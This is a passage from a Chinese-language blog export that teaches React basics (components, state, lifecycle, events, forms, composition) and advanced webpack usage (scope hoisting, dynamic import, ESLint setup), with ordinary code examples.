class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 函数组件</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Welcome</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// class组件</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Welcome</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, &#123;this.props.name&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 组件的组合使用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Avatar</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;img className=<span class=\"string\">\"Avatar\"</span> src=&#123;props.user.avatarUrl&#125; alt=&#123;props.user.name&#125; /&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">UserInfo</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;div className=<span class=\"string\">\"UserInfo\"</span>&gt;</span><br><span class=\"line\">      &lt;Avatar user=&#123;props.user&#125; /&gt;</span><br><span class=\"line\">      &lt;div className=<span class=\"string\">\"UserInfo-name\"</span>&gt;&#123;props.user.name&#125;&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;/</span>div&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Comment</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;div className=<span class=\"string\">\"Comment\"</span>&gt;</span><br><span class=\"line\">      &lt;UserInfo user=&#123;props.author&#125; /&gt;</span><br><span class=\"line\">      &lt;div className=<span class=\"string\">\"Comment-text\"</span>&gt;&#123;props.text&#125;&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;div className=\"Comment-date\"&gt;&#123;formatDate(props.date)&#125;&lt;/</span>div&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Props-与-State\"><a href=\"#Props-与-State\" class=\"headerlink\" title=\"Props 与 State\"></a>Props 与 State</h2><p>组件可以把它的 state 作为 props 向下传递到它的子组件中，而子组件不能直接修改 props，只能通过事件通知父级修改；state 是记录自身状态的私有属性，可以修改。这种数据流向是“自上而下”的，一般称为单向数据流。</p>\n<p>props.children 可以理解为插槽。</p>\n<p>state 修改需要注意三点：</p>\n<ol>\n<li>不要直接修改 State，而是调用 <code>setState()</code>方法；</li>\n<li>State 的更新可能是异步的，因此不能依赖当前状态去更新下一个状态；</li>\n<li>State 的更新会被合并。</li>\n</ol>\n<h2 id=\"生命周期\"><a href=\"#生命周期\" class=\"headerlink\" title=\"生命周期\"></a>生命周期</h2><p>组件的生命周期图谱如下：<br><img src=\"/react-basic/life.jpg\" alt=\"生命周期图谱\"><br>通常在 constructor 中进行 state 等初始化工作，componentDidMount 中进行 DOM 渲染完成后的工作，componentWillUnmount 中进行资源释放工作。示例如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Clock</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123; <span class=\"attr\">date</span>: <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>() &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  componentDidMount() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.timerID = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"keyword\">this</span>.tick(), <span class=\"number\">1000</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  componentWillUnmount() &#123;</span><br><span class=\"line\">    clearInterval(<span class=\"keyword\">this</span>.timerID);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  tick() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">      date: <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;h1&gt;Hello, world!<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span></span><br><span class=\"line\">        &lt;h2&gt;It is &#123;<span class=\"keyword\">this</span>.state.date.toLocaleTimeString()&#125;.&lt;<span class=\"regexp\">/h2&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>div&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ReactDOM.render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">Clock</span> /&gt;</span>, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure>\n<p>更多生命周期介绍请参考<a href=\"http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/\" target=\"_blank\" rel=\"noopener\">官方文档</a>。</p>\n<h2 id=\"事件处理\"><a href=\"#事件处理\" class=\"headerlink\" title=\"事件处理\"></a>事件处理</h2><p>React 元素的事件处理和 DOM 元素的很相似，但是有一点语法上的不同:</p>\n<ul>\n<li>React 事件的命名采用小驼峰式（camelCase），而不是纯小写。</li>\n<li>使用 JSX 语法时你需要传入一个函数作为事件处理函数，而不是一个字符串。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;button onClick=&#123;activateLasers&#125;&gt;Activate Lasers&lt;<span class=\"regexp\">/button&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h3><h4 id=\"不能通过放回-false-的方式组织默认行为，而是要显式的使用-preventDefault\"><a href=\"#不能通过放回-false-的方式组织默认行为，而是要显式的使用-preventDefault\" class=\"headerlink\" title=\"不能通过放回 false 的方式组织默认行为，而是要显式的使用 preventDefault\"></a>不能通过放回 false 的方式组织默认行为，而是要显式的使用 preventDefault</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 错误 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"console.log('The link was clicked.'); return false\"</span>&gt;</span></span><br><span class=\"line\">  Click me</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 正确</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ActionLink</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handleClick</span>(<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">    e.preventDefault();</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'The link was clicked.'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;a href=<span class=\"string\">\"#\"</span> onClick=&#123;handleClick&#125;&gt;</span><br><span class=\"line\">      Click me</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/a&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"回调函数中的-this-绑定问题\"><a href=\"#回调函数中的-this-绑定问题\" class=\"headerlink\" title=\"回调函数中的 this 绑定问题\"></a>回调函数中的 this 绑定问题</h4><p>因为传入的回调函数在调用的时候上下文（context）已经不是该组件实例本身，所以想要 this 指向该组件实例本身，需要传入的时候显式的指定上下文。</p>\n<p>bind 用法：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Title</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  handleClickOnTitle(e) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;this.handleClickOnTitle.bind(this)&#125;</span>&gt;</span>React 小书<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>class fields 用法（Create React App 默认启用此语法）：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LoggingButton</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 此语法确保 `handleClick` 内的 `this` 已被绑定。</span></span><br><span class=\"line\">  <span class=\"comment\">// 注意: 这是 *实验性* 语法。</span></span><br><span class=\"line\">  handleClick = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'this is:'</span>, <span class=\"keyword\">this</span>);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;this.handleClick&#125;</span>&gt;</span>Click me<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>箭头函数用法：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LoggingButton</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  handleClick() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'this is:'</span>, <span class=\"keyword\">this</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 此语法确保 `handleClick` 内的 `this` 已被绑定。</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;e</span> =&gt;</span> this.handleClick(e)&#125;&gt;Click me<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"条件渲染与列表\"><a href=\"#条件渲染与列表\" class=\"headerlink\" title=\"条件渲染与列表\"></a>条件渲染与列表</h2><p>JSX 只是 JavaScript 的语法糖，可以完全使用 JavaScript 特性。对于列表渲染，需要在加上 key，值只要保证兄弟节点间唯一即可。</p>\n<h2 id=\"表单\"><a href=\"#表单\" class=\"headerlink\" title=\"表单\"></a>表单</h2><h3 id=\"受控组件\"><a href=\"#受控组件\" class=\"headerlink\" title=\"受控组件\"></a>受控组件</h3><p>表单数据由 React 组件来管理。具体实现形式如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NameForm</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123; <span class=\"attr\">value</span>: <span class=\"string\">''</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.handleChange = <span class=\"keyword\">this</span>.handleChange.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.handleSubmit = <span class=\"keyword\">this</span>.handleSubmit.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  handleChange(event) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(&#123; <span class=\"attr\">value</span>: event.target.value &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  handleSubmit(event) &#123;</span><br><span class=\"line\">    alert(<span class=\"string\">'提交的名字: '</span> + <span class=\"keyword\">this</span>.state.value);</span><br><span class=\"line\">    event.preventDefault();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;form onSubmit=&#123;<span class=\"keyword\">this</span>.handleSubmit&#125;&gt;</span><br><span class=\"line\">        &lt;label&gt;</span><br><span class=\"line\">          名字:</span><br><span class=\"line\">          &lt;input</span><br><span class=\"line\">            type=<span class=\"string\">\"text\"</span></span><br><span class=\"line\">            value=&#123;<span class=\"keyword\">this</span>.state.value&#125;</span><br><span class=\"line\">            onChange=&#123;<span class=\"keyword\">this</span>.handleChange&#125;</span><br><span class=\"line\">          /&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/label&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;input type=\"submit\" value=\"提交\" /</span>&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/form&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>作为受控组件，<code>&lt;textarea&gt;</code> 和 <code>&lt;select&gt;</code>元素赋值形式做了调整，改成与 input 相同，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;textarea value=&#123;<span class=\"keyword\">this</span>.state.value&#125; onChange=&#123;<span class=\"keyword\">this</span>.handleChange&#125; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;select value=&#123;<span class=\"keyword\">this</span>.state.value&#125; onChange=&#123;<span class=\"keyword\">this</span>.handleChange&#125;&gt;</span><br><span class=\"line\">  &lt;option value=<span class=\"string\">\"grapefruit\"</span>&gt;葡萄柚&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;option value=\"lime\"&gt;酸橙&lt;/</span>option&gt;</span><br><span class=\"line\">  &lt;option value=<span class=\"string\">\"coconut\"</span>&gt;椰子&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;option value=\"mango\"&gt;芒果&lt;/</span>option&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/select&gt;</span></span><br></pre></td></tr></table></figure>\n<p>注意点：</p>\n<p>文件 input 标签为非受控组件<code>&lt;input type=&quot;file&quot; /&gt;</code>。</p>\n<p>设置了 value 值的受控组件是不可编辑的，若仍然可编辑，那可能是 value 值为 undefined 或 null。</p>\n<h3 id=\"非受控组件\"><a href=\"#非受控组件\" class=\"headerlink\" title=\"非受控组件\"></a>非受控组件</h3><p>将在高级部分讲解，<a href=\"https://zh-hans.reactjs.org/docs/uncontrolled-components.html\" target=\"_blank\" rel=\"noopener\">官方文档</a>。</p>\n<h2 id=\"状态提升\"><a href=\"#状态提升\" class=\"headerlink\" title=\"状态提升\"></a>状态提升</h2><p>通常，多个组件需要反映相同的变化数据，这时我们建议将共享状态提升到最近的共同父组件中去。</p>\n<h2 id=\"组合-vs-继承\"><a href=\"#组合-vs-继承\" class=\"headerlink\" title=\"组合 vs 继承\"></a>组合 vs 继承</h2><p>React 有十分强大的组合模式。我们推荐使用组合而非继承来实现组件间的代码重用。</p>\n<h3 id=\"包含关系\"><a href=\"#包含关系\" class=\"headerlink\" title=\"包含关系\"></a>包含关系</h3><p>概念同 Vue 的插槽</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 匿名</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">FancyBorder</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;div className=&#123;<span class=\"string\">'FancyBorder FancyBorder-'</span> + props.color&#125;&gt;</span><br><span class=\"line\">      &#123;props.children&#125;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">function WelcomeDialog() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  return (</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;FancyBorder color=\"blue\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;h1 className=\"Dialog-title\"&gt;Welcome&lt;/</span>h1&gt;</span><br><span class=\"line\">      &lt;p className=<span class=\"string\">\"Dialog-message\"</span>&gt;Thank you <span class=\"keyword\">for</span> visiting our spacecraft!<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span><br><span class=\"line\">    &lt;<span class=\"regexp\">/FancyBorder&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/ 具名</span></span><br><span class=\"line\"><span class=\"regexp\">function SplitPane(props) &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  return (</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;div className=\"SplitPane\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;div className=\"SplitPane-left\"&gt;&#123;props.left&#125;&lt;/</span>div&gt;</span><br><span class=\"line\">      &lt;div className=<span class=\"string\">\"SplitPane-right\"</span>&gt;&#123;props.right&#125;&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;/</span>div&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">App</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">SplitPane</span> <span class=\"attr\">left</span>=<span class=\"string\">&#123;</span>&lt;<span class=\"attr\">Contacts</span> /&gt;</span>&#125; right=&#123;<span class=\"tag\">&lt;<span class=\"name\">Chat</span> /&gt;</span>&#125; /&gt;;</span></span><br><span class=\"line\"><span class=\"xml\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"http://huziketang.mangojuice.top/books/react/lesson9\" target=\"_blank\" rel=\"noopener\">http://huziketang.mangojuice.top/books/react/lesson9</a></p>\n<p><a href=\"https://zh-hans.reactjs.org/docs/introducing-jsx.html\" target=\"_blank\" rel=\"noopener\">https://zh-hans.reactjs.org/docs/introducing-jsx.html</a></p>"},{"title":"webpack进阶用法二","date":"2019-09-17T02:19:55.000Z","updated":"2019-09-17T02:19:55.000Z","_content":"\n# 概述\n\n本文介绍的 webpack 用法有：Scope Hosting 的使用和原理分析。\n\n<!-- more -->\n\n# 详述\n\n## Scope Hosting 的使用和原理分析\n\n### 构建后的代码存在大量闭包代码\n\n大量作用域包裹代码，导致体积增大（模块越多越明显）；运行代码时创建的函数作用域变多，内存开销变大。\n![](scope-hoisting.jpg)\n\n### webpack 的模块机制\n\n![](module.jpg)\n\n### 原理\n\n将所有模块的代码按照引用顺序放在一个函数作用域里，然后适当的重命名一些变量以防止变量名冲突。\n\n### 使用\n\n要求必须是 ES6 语法（原因同上一篇 tree shaking），CommonJS 不支持。若是 webpack4.x 设置 mode 为 production 后默认开启，之前版本及其他模式需要显式引用`ModuleConcatenationPlugin`插件，示例如下：\n\n<!-- webpack.config.js -->\n\n```js\nconst webpack = require('webpack')\nmodule.exports = {\n  ...\n  plugins: [new webpack.optimize.ModuleConcatenationPlugin()]\n};\n```\n\n## 代码分割和动态 import\n\n对于大的 web 应用，把所有代码放到一个文件显然不合适，一般会根据需要进行分割。常见处理方式有：提出公共代码，见上一篇“提取页面公共资源”部分；脚本懒加载，使得初始加载的代码更小。\n\n### 懒加载 JS 方式\n\n- CommonJS：require.ensure\n- ES6：动态 import（目前还没有原生支持，需要 babel 转换）\n\n### 动态 import\n\n#### 安装配置：\n\n```shell\nnpm install @babel/plugin-syntax-dynamic-import -D\n```\n\n```json\n// .babelrc\n{\n  \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"],\n  \"plugins\": [\"@babel/plugin-syntax-dynamic-import\"]\n}\n```\n\n#### 打包后效果示例：\n\n![](import.jpg)\n\n#### 懒加载使用示例：\n\n```js\n// text.js\nimport React from 'react';\n\nexport default () => <div>动态 import</div>;\n```\n\n```js\n// index.js\n'use strict';\n\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport '../../common/index';\nimport logo from './images/logo.png';\nimport './search.less';\n\nclass Search extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      Text: null\n    };\n  }\n\n  loadComponent() {\n    import('./text.js').then(textModule => {\n      this.setState({\n        Text: textModule.default\n      });\n    });\n  }\n  render() {\n    const { Text } = this.state;\n    return (\n      <div className='search-text'>\n        {Text ? <Text></Text> : null}\n        搜索文字的内容\n        <img src={logo} onClick={this.loadComponent.bind(this)} />\n      </div>\n    );\n  }\n}\n\nReactDOM.render(<Search />, document.getElementById('root'));\n```\n\n## 在 webpack 中使用 ESLint\n\n以下以基于 Airbnb 的 eslint 规则库的使用为例\n\n### 安装依赖包\n\n```shell\n# airbnb的eslint规则库\nnpm i eslint-config-airbnb -D\n# airbnb的eslint规则库依赖包\nnpm i eslint eslint-plugin-import eslint-plugin-react eslint-plugin-react-hooks eslint-plugin-jsx-a11y -D\n# eslint解析器\nnpm i babel-eslint -D\n# webpack loader\nnpm i eslint-loader -D\n```\n\n### 配置 eslint 和 webpack\n\n```js\n// .eslintrc.js\nmodule.exports = {\n  parser: 'babel-eslint',\n  extends: 'airbnb',\n  env: {\n    browser: true,\n    node: true\n  },\n  rules: {}\n};\n```\n\n```js\n// webpack.config.js\nmodule.exports = {\n    ...\n    module: {\n        rules: [\n            {\n                